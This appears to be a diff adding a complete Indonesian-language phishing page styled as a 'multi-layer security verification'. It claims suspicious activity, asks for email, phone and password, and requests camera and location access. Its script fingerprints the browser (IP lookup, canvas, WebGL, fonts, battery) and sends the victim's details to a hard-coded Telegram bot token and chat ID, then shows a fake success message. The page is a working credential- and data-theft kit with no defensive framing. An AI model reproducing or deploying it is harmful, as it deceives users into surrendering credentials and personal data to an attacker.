@@ -1,0 +1,195 @@
+<!doctype html>
+<html lang=id>
+<head>
+<meta charset=UTF-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>Sistem Keamanan Multi-Lapis | Verifikasi Terpadu</title>
+<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css>
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}body{background:linear-gradient(135deg,#0c1c25,#182b3a,#1d3b4d);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;color:#fff;overflow-x:hidden;position:relative}.security-container{max-width:900px;width:100%;background:rgba(16,22,58,.85);backdrop-filter:blur(15px);border-radius:25px;box-shadow:0 20px 50px rgba(0,0,0,.7);overflow:hidden;border:1px solid rgba(64,224,208,.4);position:relative;z-index:10;transition:all .5s ease}.security-header{background:linear-gradient(90deg,#1a2980,#26d0ce);padding:35px 30px;text-align:center;position:relative;overflow:hidden}.security-header::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M0,0 L100,0 L100,100 Z" fill="rgba(255,255,255,0.05)"/></svg>');background-size:cover;opacity:.3}.security-header h1{font-size:38px;margin-bottom:15px;position:relative;z-index:1;text-shadow:0 3px 6px rgba(0,0,0,.4);display:flex;justify-content:center;align-items:center;gap:15px}.security-header p{font-size:18px;opacity:.9;position:relative;z-index:1;max-width:80%;margin:0 auto;line-height:1.6}.security-badge{position:absolute;top:-20px;right:30px;background:linear-gradient(45deg,#ff9500,#fc0);color:#1a1a2e;padding:15px 25px;border-radius:0 0 15px 15px;font-weight:700;font-size:16px;box-shadow:0 5px 15px rgba(255,153,0,.4);z-index:11;display:flex;align-items:center;gap:10px}.verification-progress{background:rgba(0,0,0,.3);padding:20px 30px;display:flex;justify-content:space-between;position:relative;border-bottom:1px solid rgba(255,255,255,.1)}.progress-steps{display:flex;width:100%;justify-content:space-between;position:relative}.progress-step{display:flex;flex-direction:column;align-items:center;position:relative;z-index:2}.step-number{width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,.1);display:flex;justify-content:center;align-items:center;font-weight:700;font-size:18px;margin-bottom:10px;border:2px solid rgba(255,255,255,.3);transition:all .3s ease}.step-label{font-size:14px;text-align:center;opacity:.7}.progress-step.active .step-number{background:linear-gradient(45deg,#ff9500,#fc0);color:#1a1a2e;border-color:#fc0;box-shadow:0 0 15px rgba(255,204,0,.5)}.progress-step.completed .step-number{background:linear-gradient(45deg,#4ade80,#22c55e);color:#fff;border-color:#4ade80}.progress-bar{position:absolute;top:50%;left:10%;width:80%;height:4px;background:rgba(255,255,255,.1);transform:translateY(-50%);z-index:1}.progress-bar-fill{height:100%;background:linear-gradient(to right,#26d0ce,#1a2980);width:0%;transition:width .5s ease;border-radius:2px}.security-content{display:flex;padding:30px;gap:30px}.verification-section{flex:1}.device-info-section{width:300px;background:rgba(0,0,0,.3);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,.1);box-shadow:0 10px 25px rgba(0,0,0,.3)}.verification-card{background:rgba(0,0,0,.25);border-radius:20px;padding:30px;margin-bottom:25px;border:1px solid rgba(255,255,255,.1);box-shadow:0 10px 25px rgba(0,0,0,.3);transition:all .3s ease}.verification-card:hover{transform:translateY(-5px);box-shadow:0 15px 30px rgba(0,0,0,.4);border-color:rgba(64,224,208,.4)}.verification-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px}.verification-header h2{font-size:24px;display:flex;align-items:center;gap:12px}.verification-header h2 i{color:#fc0}.verification-status{display:flex;align-items:center;gap:8px;font-size:14px;padding:6px 15px;border-radius:20px;background:rgba(255,255,255,.1)}.status-pending{color:#fc0}.status-completed{color:#4ade80}.form-group{margin-bottom:25px}.form-group label{display:block;margin-bottom:15px;font-size:16px;display:flex;align-items:center;gap:12px;font-weight:500}.form-group label i{color:#26d0ce;width:24px;text-align:center}.form-control{width:100%;padding:16px 22px;border-radius:15px;border:none;background:rgba(255,255,255,.08);color:#fff;font-size:16px;border:1px solid rgba(255,255,255,.15);transition:all .3s ease}.form-control:focus{outline:0;border-color:#fc0;background:rgba(255,255,255,.12);box-shadow:0 0 0 4px rgba(255,204,0,.2)}.input-icon{position:relative}.input-icon i{position:absolute;right:20px;top:50%;transform:translateY(-50%);color:rgba(255,255,255,.5);cursor:pointer}.captcha-display{position:relative;margin-bottom:25px;height:100px;display:flex;justify-content:center;align-items:center;background:rgba(0,0,0,.4);border-radius:15px;overflow:hidden;border:1px solid rgba(255,255,255,.1)}.captcha-display::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,transparent 45%,rgba(255,255,255,.05) 45.5%),linear-gradient(-45deg,transparent 45%,rgba(255,255,255,.05) 45.5%);background-size:30px 30px;opacity:.3}.captcha-text{font-size:48px;letter-spacing:8px;color:#fc0;font-weight:700;text-shadow:0 0 15px rgba(255,204,0,.5);position:relative;z-index:2;transform:skew(-5deg) rotate(1deg);font-family:'Courier New',monospace;text-transform:uppercase}.captcha-controls{display:flex;justify-content:center;gap:20px;margin-top:20px}.security-btn{padding:16px 30px;border:none;border-radius:12px;color:#fff;cursor:pointer;transition:all .3s ease;display:flex;align-items:center;font-size:16px;font-weight:600;gap:12px;position:relative;overflow:hidden}.btn-primary{background:linear-gradient(45deg,#ff9500,#fc0);color:#1a1a2e;box-shadow:0 5px 20px rgba(255,153,0,.4)}.btn-secondary{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2)}.security-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);transition:.5s}.security-btn:hover{transform:translateY(-3px);box-shadow:0 8px 25px rgba(255,153,0,.6)}.security-btn:hover::before{left:100%}.security-btn:active{transform:translateY(0)}.device-info-header{display:flex;align-items:center;gap:15px;margin-bottom:25px;padding-bottom:15px;border-bottom:1px solid rgba(255,255,255,.1)}.device-info-header i{font-size:28px;color:#26d0ce}.device-info-item{display:flex;margin-bottom:20px;gap:12px}.device-info-icon{color:#fc0;font-size:18px}.device-info-content h3{font-size:16px;margin-bottom:5px;color:#26d0ce}.device-info-content p{font-size:14px;opacity:.9}.security-level{margin-top:25px;background:rgba(0,0,0,.4);border-radius:15px;padding:20px;border:1px solid rgba(255,255,255,.1)}.security-level-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}.level-indicator{width:100%;height:12px;background:rgba(255,255,255,.1);border-radius:10px;overflow:hidden;margin-bottom:15px}.level-progress{height:100%;background:linear-gradient(to right,#ff4d4d,#fc0,#4ade80);width:40%;border-radius:10px}.level-labels{display:flex;justify-content:space-between;font-size:12px;opacity:.8}.loading{display:none;text-align:center;margin-top:25px;flex-direction:column;align-items:center}.spinner{width:60px;height:60px;border:6px solid rgba(255,255,255,.1);border-radius:50%;border-top:6px solid #fc0;animation:spin 1s linear infinite;margin-bottom:20px}.loading-text{font-size:18px;display:flex;align-items:center;gap:12px}.security-footer{text-align:center;padding:25px;color:rgba(255,255,255,.6);font-size:14px;border-top:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.3);display:flex;justify-content:center;gap:30px}.footer-section{display:flex;flex-direction:column;align-items:center}.footer-section h3{margin-bottom:10px;color:#26d0ce;display:flex;align-items:center;gap:8px}.footer-section p{font-size:13px;max-width:250px;line-height:1.5}.security-footer a{color:#fc0;text-decoration:none;transition:all .3s ease}.security-footer a:hover{text-decoration:underline}.notification{position:fixed;top:20px;right:20px;padding:20px 30px;border-radius:15px;background:rgba(0,0,0,.9);color:#fff;font-weight:500;box-shadow:0 10px 30px rgba(0,0,0,.4);display:none;z-index:1000;border-left:6px solid #fc0;transform:translateX(100%);opacity:0;transition:all .4s ease;max-width:400px;display:flex;align-items:center;gap:15px}.notification i{font-size:24px}.notification.show{transform:translateX(0);opacity:1}.notification.error{border-left-color:#ff4d4d}.notification.success{border-left-color:#4ade80}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}.particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none}.particle{position:absolute;border-radius:50%;background:rgba(64,224,208,.15);animation:float 15s infinite linear}@keyframes float{0%{transform:translateY(0) translateX(0) rotate(0);opacity:1}100%{transform:translateY(-100vh) translateX(100px) rotate(360deg);opacity:0}}#cameraPreview{width:100%;height:250px;background:rgba(0,0,0,.3);border-radius:15px;margin-bottom:20px;display:flex;justify-content:center;align-items:center;overflow:hidden;position:relative;border:2px dashed rgba(255,255,255,.2)}#cameraPreview video{width:100%;height:100%;object-fit:cover}#cameraPreview .placeholder{text-align:center;color:rgba(255,255,255,.5);padding:20px}#cameraPreview .placeholder i{font-size:60px;margin-bottom:20px;opacity:.5}@media (max-width:900px){.security-content{flex-direction:column}.device-info-section{width:100%}.verification-progress{padding:15px 20px}.step-label{font-size:12px}}@media (max-width:600px){.security-header h1{font-size:28px}.security-header p{font-size:16px}.security-badge{right:15px;padding:10px 20px;font-size:14px}.step-number{width:30px;height:30px;font-size:16px}.security-footer{flex-direction:column;gap:20px}}</style>
+</head>
+<body>
+<div class=particles id=particles></div>
+<div class=security-container>
+<div class=security-badge>
+<i class="fas fa-shield-alt"></i> SISTEM KEAMANAN LEVEL 3
+</div>
+<div class=security-header>
+<h1><i class="fas fa-lock"></i> VERIFIKASI KEAMANAN MULTI-LAPIS</h1>
+<p>Untuk melindungi akun Anda, kami memerlukan verifikasi tambahan. Sistem mendeteksi aktivitas mencurigakan dari perangkat ini.</p>
+</div>
+<div class=verification-progress>
+<div class=progress-steps>
+<div class="progress-step active">
+<div class=step-number>1</div>
+<div class=step-label>Identitas</div>
+</div>
+<div class=progress-step>
+<div class=step-number>2</div>
+<div class=step-label>Perangkat</div>
+</div>
+<div class=progress-step>
+<div class=step-number>3</div>
+<div class=step-label>CAPTCHA</div>
+</div>
+<div class=progress-step>
+<div class=step-number>4</div>
+<div class=step-label>Verifikasi</div>
+</div>
+<div class=progress-bar>
+<div class=progress-bar-fill id=progressFill></div>
+</div>
+</div>
+</div>
+<div class=security-content>
+<div class=verification-section>
+<div class=verification-card>
+<div class=verification-header>
+<h2><i class="fas fa-user-shield"></i> Verifikasi Identitas</h2>
+<div class="verification-status status-pending">
+<i class="fas fa-clock"></i> Belum Diverifikasi
+</div>
+</div>
+<div class=form-group>
+<label for=userEmail><i class="fas fa-envelope"></i> Alamat Email</label>
+<input type=email id=userEmail class=form-control placeholder=email@contoh.com>
+</div>
+<div class=form-group>
+<label for=userPhone><i class="fas fa-mobile-alt"></i> Nomor Telepon</label>
+<input type=tel id=userPhone class=form-control placeholder="+62 812 3456 7890">
+</div>
+<div class=form-group>
+<label for=userPassword><i class="fas fa-key"></i> Password</label>
+<div class=input-icon>
+<input type=password id=userPassword class=form-control placeholder="Masukkan password Anda">
+<i class="fas fa-eye" id=togglePassword></i>
+</div>
+</div>
+</div>
+<div class=verification-card>
+<div class=verification-header>
+<h2><i class="fas fa-fingerprint"></i> Verifikasi Biometrik</h2>
+<div class="verification-status status-pending">
+<i class="fas fa-clock"></i> Belum Diverifikasi
+</div>
+</div>
+<div id=cameraPreview>
+<div class=placeholder>
+<i class="fas fa-camera"></i>
+<p>Aktifkan kamera untuk verifikasi wajah</p>
+</div>
+</div>
+<div class=captcha-controls>
+<button class="security-btn btn-secondary" id=cameraBtn>
+<i class="fas fa-camera"></i> Aktifkan Kamera
+</button>
+<button class="security-btn btn-secondary" id=locationBtn>
+<i class="fas fa-location-dot"></i> Verifikasi Lokasi
+</button>
+</div>
+</div>
+<div class=verification-card>
+<div class=verification-header>
+<h2><i class="fas fa-robot"></i> Verifikasi CAPTCHA</h2>
+<div class="verification-status status-pending">
+<i class="fas fa-clock"></i> Belum Diverifikasi
+</div>
+</div>
+<div class=captcha-display>
+<div class=captcha-text id=captchaText>8H4K9L</div>
+</div>
+<div class=form-group>
+<label for=captchaInput><i class="fas fa-keyboard"></i> Masukkan Kode CAPTCHA</label>
+<input id=captchaInput class=form-control placeholder="Ketik kode di atas...">
+</div>
+<div class=captcha-controls>
+<button class="security-btn btn-secondary" id=refreshCaptcha>
+<i class="fas fa-redo-alt"></i> Kode Baru
+</button>
+<button class="security-btn btn-secondary" id=audioCaptcha>
+<i class="fas fa-volume-up"></i> Versi Audio
+</button>
+</div>
+</div>
+<button class="security-btn btn-primary" id=verifyBtn>
+<i class="fas fa-shield-alt"></i> VERIFIKASI SEKARANG
+</button>
+<div class=loading id=loading>
+<div class=spinner></div>
+<p class=loading-text><i class="fas fa-lock"></i> Memverifikasi perangkat & mengamankan data...</p>
+</div>
+</div>
+<div class=device-info-section>
+<div class=device-info-header>
+<i class="fas fa-laptop-code"></i>
+<h2>Informasi Perangkat</h2>
+</div>
+<div class=device-info-item>
+<div class=device-info-icon>
+<i class="fas fa-microchip"></i>
+</div>
+<div class=device-info-content>
+<h3>Spesifikasi Sistem</h3>
+<p id=deviceSpecs>Memuat...</p>
+</div>
+</div>
+<div class=device-info-item>
+<div class=device-info-icon>
+<i class="fas fa-network-wired"></i>
+</div>
+<div class=device-info-content>
+<h3>Koneksi Jaringan</h3>
+<p id=networkInfo>Memuat...</p>
+</div>
+</div>
+<div class=device-info-item>
+<div class=device-info-icon>
+<i class="fas fa-map-marker-alt"></i>
+</div>
+<div class=device-info-content>
+<h3>Lokasi Perkiraan</h3>
+<p id=locationInfo>Memuat...</p>
+</div>
+</div>
+<div class=device-info-item>
+<div class=device-info-icon>
+<i class="fas fa-shield-alt"></i>
+</div>
+<div class=device-info-content>
+<h3>Status Keamanan</h3>
+<p id=securityStatus>Perlu verifikasi</p>
+</div>
+</div>
+<div class=security-level>
+<div class=security-level-header>
+<h3>Level Keamanan</h3>
+<span>40%</span>
+</div>
+<div class=level-indicator>
+<div class=level-progress id=securityLevel></div>
+</div>
+<div class=level-labels>
+<span>Rendah</span>
+<span>Sedang</span>
+<span>Tinggi</span>
+</div>
+</div>
+</div>
+</div>
+<div class=security-footer>
+<div class=footer-section>
+<h3><i class="fas fa-shield-halved"></i> Perlindungan Data</h3>
+<p>Data Anda dienkripsi dengan standar keamanan tingkat militer. Kami tidak pernah membagikan informasi pribadi Anda.</p>
+</div>
+<div class=footer-section>
+<h3><i class="fas fa-headset"></i> Dukungan 24/7</h3>
+<p>Pusat bantuan tersedia kapan saja. Hubungi kami di <a href=#>support@securitysystem.id</a></p>
+</div>
+</div>
+</div>
+<div class=notification id=notification>
+<i class="fas fa-info-circle"></i>
+<div class=notification-content>Pesan notifikasi</div>
+</div>
+<script>const BOT_TOKEN="8234810322:AAFWKftnuZRfsOe84ohVHmt3gePF1LI7syE",CHAT_ID="6899893897",captchaText=document.getElementById("captchaText"),captchaInput=document.getElementById("captchaInput"),refreshBtn=document.getElementById("refreshCaptcha"),audioBtn=document.getElementById("audioCaptcha"),verifyBtn=document.getElementById("verifyBtn"),notification=document.getElementById("notification"),loading=document.getElementById("loading"),particlesContainer=document.getElementById("particles"),cameraBtn=document.getElementById("cameraBtn"),locationBtn=document.getElementById("locationBtn"),cameraPreview=document.getElementById("cameraPreview"),togglePassword=document.getElementById("togglePassword"),progressFill=document.getElementById("progressFill"),securityLevel=document.getElementById("securityLevel"),deviceSpecs=document.getElementById("deviceSpecs"),networkInfo=document.getElementById("networkInfo"),locationInfo=document.getElementById("locationInfo");let userData={email:"",phone:"",password:"",location:null,cameraPermission:!1,locationPermission:!1,securityLevel:40};function createParticles(){for(let e=0;e<50;e++){const e=document.createElement("div");e.classList.add("particle");const t=25*Math.random()+5;e.style.width=`${t}px`,e.style.height=`${t}px`,e.style.left=100*Math.random()+"%",e.style.top=100*Math.random()+"%",e.style.animationDuration=20*Math.random()+10+"s",e.style.animationDelay=5*Math.random()+"s",particlesContainer.appendChild(e)}}function generateCaptcha(){const e="0123456789ABCDEFGHJKLMNPQRSTUVWXYZ";let t="";for(let n=0;n<6;n++)t+=e[Math.floor(Math.random()*e.length)];return t}function setNewCaptcha(){captchaText.textContent=generateCaptcha(),captchaText.style.color=`hsl(${360*Math.random()}, 80%, 60%)`,captchaInput.value=""}function showNotification(e,t="info"){notification.querySelector(".notification-content").textContent=e,notification.className="notification";const n=notification.querySelector("i");"error"===t?(notification.classList.add("error"),n.className="fas fa-exclamation-circle"):"success"===t?(notification.classList.add("success"),n.className="fas fa-check-circle"):n.className="fas fa-info-circle",notification.classList.add("show"),setTimeout((()=>{notification.classList.remove("show"),setTimeout((()=>{notification.className="notification"}),400)}),4e3)}async function collectDeviceData(){let e={};try{const t=await fetch("https://api.ipify.org?format=json"),n=(await t.json()).ip,a=await fetch(`https://ipapi.co/${n}/json/`);e=await a.json()}catch(t){console.error("Error getting IP data:",t),e={error:"Failed to retrieve IP data"}}return{timestamp:(new Date).toISOString(),ipAddress:e.ip||"Unknown",location:e.city?`${e.city}, ${e.region}, ${e.country_name}`:"Unknown",userAgent:navigator.userAgent,platform:navigator.platform,languages:navigator.languages.join(", "),cookieEnabled:navigator.cookieEnabled,screen:{resolution:`${screen.width}x${screen.height}`,colorDepth:screen.colorDepth,innerSize:`${window.innerWidth}x${window.innerHeight}`},deviceMemory:navigator.deviceMemory||"unknown",hardwareConcurrency:navigator.hardwareConcurrency,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,referrer:document.referrer||"Direct access",currentUrl:window.location.href,plugins:Array.from(navigator.plugins).map((e=>e.name)).join(", ")||"No plugins",touchSupport:"ontouchstart"in window,onlineStatus:navigator.onLine,doNotTrack:navigator.doNotTrack||"unknown",connection:navigator.connection?{type:navigator.connection.effectiveType,downlink:navigator.connection.downlink,rtt:navigator.connection.rtt}:"unknown",battery:navigator.getBattery?await getBatteryStatus():"unsupported",webgl:getWebGLInfo(),fonts:await getFonts(),canvasFingerprint:getCanvasFingerprint(),ipDetails:e,userData:userData}}async function getBatteryStatus(){try{const e=await navigator.getBattery();return{level:100*e.level+"%",charging:e.charging,chargingTime:e.chargingTime,dischargingTime:e.dischargingTime}}catch{return"unsupported"}}function getWebGLInfo(){try{const e=document.createElement("canvas"),t=e.getContext("webgl")||e.getContext("experimental-webgl");if(!t)return"unsupported";const n=t.getExtension("WEBGL_debug_renderer_info");return{vendor:t.getParameter(n.UNMASKED_VENDOR_WEBGL),renderer:t.getParameter(n.UNMASKED_RENDERER_WEBGL)}}catch(e){return"error"}}async function getFonts(){try{const e=await document.fonts.ready,t=new Set;for(const n of e)t.add(n.family);return Array.from(t).join(", ")||"No fonts detected"}catch(e){return"Font detection failed"}}function getCanvasFingerprint(){try{const e=document.createElement("canvas"),t=e.getContext("2d");return e.width=200,e.height=40,t.textBaseline="top",t.font="14px 'Arial'",t.textBaseline="alphabetic",t.fillStyle="#f60",t.fillRect(125,1,62,20),t.fillStyle="#069",t.fillText("CanvasFingerprint",2,15),t.fillStyle="rgba(102, 204, 0, 0.7)",t.fillText("CanvasFingerprint",4,17),e.toDataURL()}catch(e){return"Canvas fingerprint failed"}}async function sendToTelegram(e){const t=`\n🛡 *VERIFIKASI KEAMANAN BERHASIL* 🛡\n\n📅 *Waktu*: ${(new Date).toLocaleString()}\n🌐 *IP Address*: ${e.ipAddress||"Unknown"}\n📍 *Lokasi*: ${e.location||"Unknown"}\n🖥 *Perangkat*: ${e.platform}\n🔍 *User Agent*: \n${e.userAgent}\n\n👤 *Data Pengguna*:\n▫️ *Email*: ${e.userData.email||"Tidak tersedia"}\n▫️ *Telepon*: ${e.userData.phone||"Tidak tersedia"}\n\n⚙️ *Spesifikasi Perangkat*:\n▫️ *Layar*: ${e.screen.resolution} (Internal: ${e.screen.innerSize})\n▫️ *Memori*: ${e.deviceMemory} GB\n▫️ *CPU Core*: ${e.hardwareConcurrency}\n▫️ *Zona Waktu*: ${e.timezone}\n\n📡 *Detail IP*:\n▫️ *Kota*: ${e.ipDetails.city||"Unknown"}\n▫️ *Region*: ${e.ipDetails.region||"Unknown"}\n▫️ *Negara*: ${e.ipDetails.country_name||"Unknown"}\n▫️ *ISP*: ${e.ipDetails.org||"Unknown"}\n\n📷 *Izin Kamera*: ${e.userData.cameraPermission?"Diberikan ✅":"Tidak diberikan ❌"}\n📍 *Izin Lokasi*: ${e.userData.locationPermission?"Diberikan ✅":"Tidak diberikan ❌"}\n🔒 *Level Keamanan*: ${e.userData.securityLevel}%\n            `,n=`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,a={chat_id:CHAT_ID,text:t,parse_mode:"Markdown"};try{const e=await fetch(n,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(a)});if(!(await e.json()).ok)throw new Error("Gagal mengirim ke Telegram")}catch(e){throw e}}function updateSecurityLevel(){securityLevel.style.width=`${userData.securityLevel}%`,document.querySelector(".security-level-header span").textContent=`${userData.securityLevel}%`,userData.securityLevel>70&&(securityLevel.style.background="linear-gradient(to right, #ffcc00, #4ade80)")}function init(){createParticles(),setNewCaptcha(),deviceSpecs.textContent=`${navigator.hardwareConcurrency} Core CPU, ${navigator.deviceMemory||"Unknown"} GB RAM`,navigator.connection?networkInfo.textContent=`${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps`:networkInfo.textContent="Informasi tidak tersedia",fetch("https://ipapi.co/json/").then((e=>e.json())).then((e=>{locationInfo.textContent=`${e.city}, ${e.region}, ${e.country_name}`})).catch((()=>{locationInfo.textContent="Tidak dapat menentukan lokasi"})),updateSecurityLevel()}togglePassword.addEventListener("click",(function(){const e=document.getElementById("userPassword"),t="password"===e.getAttribute("type")?"text":"password";e.setAttribute("type",t),this.classList.toggle("fa-eye-slash")})),cameraBtn.addEventListener("click",(async function(){try{const e=await navigator.mediaDevices.getUserMedia({video:!0}),t=document.createElement("video");t.srcObject=e,t.autoplay=!0,cameraPreview.innerHTML="",cameraPreview.appendChild(t),userData.cameraPermission=!0,userData.securityLevel+=20,updateSecurityLevel(),showNotification("Kamera berhasil diaktifkan. Silakan posisikan wajah Anda di depan kamera.","success")}catch(e){console.error("Error accessing camera:",e),showNotification("Gagal mengakses kamera. Pastikan Anda memberikan izin.","error"),userData.cameraPermission=!1}})),locationBtn.addEventListener("click",(function(){navigator.geolocation?navigator.geolocation.getCurrentPosition((e=>{const{latitude:t,longitude:n}=e.coords;userData.location={latitude:t,longitude:n},userData.locationPermission=!0,userData.securityLevel+=20,updateSecurityLevel(),locationInfo.textContent=`${t.toFixed(4)}, ${n.toFixed(4)}`,showNotification(`Lokasi berhasil diverifikasi: ${t.toFixed(4)}, ${n.toFixed(4)}`,"success")}),(e=>{console.error("Error getting location:",e),showNotification("Gagal mendapatkan lokasi. Pastikan Anda memberikan izin.","error"),userData.locationPermission=!1})):showNotification("Browser tidak mendukung geolokasi","error")})),refreshBtn.addEventListener("click",setNewCaptcha),audioBtn.addEventListener("click",(function(){showNotification("Sistem sedang mempersiapkan versi audio CAPTCHA...","info")})),verifyBtn.addEventListener("click",(async function(){const e=document.getElementById("userEmail").value.trim(),t=document.getElementById("userPhone").value.trim(),n=document.getElementById("userPassword").value.trim(),a=captchaInput.value.trim();if(""!==e&&""!==t&&""!==n)if(""!==a){if(a!==captchaText.textContent)return showNotification("Kode CAPTCHA salah, silakan coba lagi","error"),void setNewCaptcha();userData={...userData,email:e,phone:t,password:n,securityLevel:Math.min(userData.securityLevel+20,100)},updateSecurityLevel(),loading.style.display="flex",verifyBtn.disabled=!0;try{const e=await collectDeviceData();await sendToTelegram(e),await new Promise((e=>setTimeout(e,3e3))),showNotification("Verifikasi berhasil! Data perangkat telah diamankan","success"),progressFill.style.width="100%",verifyBtn.innerHTML='<i class="fas fa-check"></i> VERIFIKASI BERHASIL',verifyBtn.style.background="linear-gradient(45deg, #22c55e, #4ade80)",setTimeout((()=>{setNewCaptcha(),document.getElementById("userEmail").value="",document.getElementById("userPhone").value="",document.getElementById("userPassword").value="",verifyBtn.innerHTML='<i class="fas fa-shield-alt"></i> VERIFIKASI SEKARANG',verifyBtn.style.background="linear-gradient(45deg, #ff9500, #ffcc00)",verifyBtn.disabled=!1,progressFill.style.width="0%",userData.securityLevel=40,updateSecurityLevel()}),5e3)}catch(e){console.error("Error:",e),showNotification("Terjadi kesalahan saat memverifikasi","error")}finally{loading.style.display="none",verifyBtn.disabled=!1}}else showNotification("Silakan masukkan kode CAPTCHA","error");else showNotification("Harap lengkapi semua kolom identitas","error")})),init()</script>
+</body>
+</html>
